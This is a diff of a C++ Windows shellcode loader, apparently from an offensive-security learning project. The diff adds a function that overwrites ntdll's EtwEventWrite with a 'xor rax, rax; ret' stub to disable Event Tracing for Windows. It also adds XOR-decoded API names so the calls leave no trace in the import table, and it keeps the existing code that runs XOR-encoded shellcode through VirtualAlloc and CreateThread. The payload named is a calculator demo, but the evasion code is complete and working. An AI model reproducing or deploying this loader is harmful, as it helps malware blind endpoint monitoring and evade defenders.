@@ -1,16 +1,70 @@
-// This program's goal is to try to create a new process to execute a shellcode that will open a calculator
-
 #include <windows.h>
 #include <cstdio>
 
 
-// This function will xor the payload with the key in order to decrypt it
+// This function XORs the data array with the key array
+// We mainly use it to decrypt at cruntime what is statically XORed
 void my_xor(unsigned char data[], int size, const unsigned char key[], int key_size)
 {
 	for (int i = 0; i < size; i++)
 	{
 		data[i] = data[i] ^ key[i % key_size];
 	}
+}
+
+// This function patches the EtwEventWrite function to avoid ETW events
+void patchEtw(char* ntdll_dll_obfuscated_function_name, char* EtwEventWrite_obfuscated_function_name)
+{
+	// Patch to apply
+	unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3};     // xor rax, rax; ret
+
+#if DEBUG
+	printf("The patch for the EtwEventWrite function is located at %p\n", &patch);
+	printf("Hit enter to continue\n");
+	getchar();
+#endif
+
+	ULONG old_protect = 0;
+	size_t patch_size = sizeof(patch);
+
+	HANDLE hcurrent_process = GetCurrentProcess();
+
+	// get the address of the EtwEventWrite function
+	void* pEtwEventWrite = (void*) GetProcAddress(GetModuleHandleA((LPCSTR) ntdll_dll_obfuscated_function_name), (LPCSTR) EtwEventWrite_obfuscated_function_name);
+
+#if DEBUG
+	printf("The EtwEventWrite is loaded at %p\n", pEtwEventWrite);
+	printf("Hit enter to continue\n");
+	getchar();
+#endif
+
+	// change the protection of the memory page containing the function
+	VirtualProtectEx(hcurrent_process, pEtwEventWrite, patch_size, PAGE_EXECUTE_READWRITE, &old_protect);
+
+#if DEBUG
+	printf("Changed memory protection of EtwEventWrite function to PAGE_EXECUTE_READWRITE\n");
+	printf("Hit enter to continue\n");
+	getchar();
+#endif
+
+	// write the patch
+	memcpy(pEtwEventWrite, patch, patch_size);
+
+#if DEBUG
+	printf("Patch applied\n");
+	printf("Hit enter to continue\n");
+	getchar();
+#endif
+
+	// restore the protection of the memory page containing the function
+	VirtualProtectEx(hcurrent_process, pEtwEventWrite, patch_size, old_protect, &old_protect);
+	FlushInstructionCache(hcurrent_process, pEtwEventWrite, patch_size);
+
+#if DEBUG
+	printf("Changed back memory protection of EtwEventWrite function to its old status\n");
+	printf("Hit enter to continue\n");
+	getchar();
+#endif
 }
 
 int main()
@@ -24,16 +78,16 @@ int main()
 #include "../../src/shellcodes/xored_calc.hpp"
 #endif
 
-	// Step 1 : Get the addresses of the functions we want to call
-
-	// Let's first deobfuscate all the names
+	// Step 1 : deobfuscate all the names
 	my_xor(KERNEL32_dll_obfuscated_function_name, sizeof(KERNEL32_dll_obfuscated_function_name), KERNEL32_dll_key, sizeof(KERNEL32_dll_key));
 	my_xor(CreateThread_obfuscated_function_name, sizeof(CreateThread_obfuscated_function_name), CreateThread_key, sizeof(CreateThread_key));
 	my_xor(VirtualAlloc_obfuscated_function_name, sizeof(VirtualAlloc_obfuscated_function_name), VirtualAlloc_key, sizeof(VirtualAlloc_key));
+	my_xor(EtwEventWrite_obfuscated_function_name, sizeof(EtwEventWrite_obfuscated_function_name), EtwEventWrite_key, sizeof(EtwEventWrite_key));
+	my_xor(ntdll_dll_obfuscated_function_name, sizeof(ntdll_dll_obfuscated_function_name), ntdll_dll_key, sizeof(ntdll_dll_key));
 	my_xor(WaitForSingleObject_obfuscated_function_name, sizeof(WaitForSingleObject_obfuscated_function_name), WaitForSingleObject_key, sizeof(WaitForSingleObject_key));
 
 #if DEBUG
-	printf("deobfuscated function names : %s (at %p), %s (at %p), %s (at %p), %s (at %p)\n",
+	printf("deobfuscated function names : %s (at %p), %s (at %p), %s (at %p), %s (at %p), %s (at %p), %s (at %p)\n",
 		   CreateThread_obfuscated_function_name,
 		   CreateThread_obfuscated_function_name,
 		   VirtualAlloc_obfuscated_function_name,
@@ -41,11 +95,19 @@ int main()
 		   WaitForSingleObject_obfuscated_function_name,
 		   WaitForSingleObject_obfuscated_function_name,
 		   KERNEL32_dll_obfuscated_function_name,
-		   KERNEL32_dll_obfuscated_function_name);
+		   KERNEL32_dll_obfuscated_function_name,
+		   EtwEventWrite_obfuscated_function_name,
+		   EtwEventWrite_obfuscated_function_name,
+		   ntdll_dll_obfuscated_function_name,
+		   ntdll_dll_obfuscated_function_name);
 	printf("Hit enter to continue\n");
 	getchar();
 #endif
 
+	// Step 2 : patch the EtwEventWrite function
+	patchEtw((char*) ntdll_dll_obfuscated_function_name, (char*) EtwEventWrite_obfuscated_function_name);
+
+	// Step 3 : get pointers to the functions to use without leaving traces in the import table
 	// get the handle to the kernel32.dll module
 	HMODULE kernel32_dll = GetModuleHandleA((char*)KERNEL32_dll_obfuscated_function_name);
 
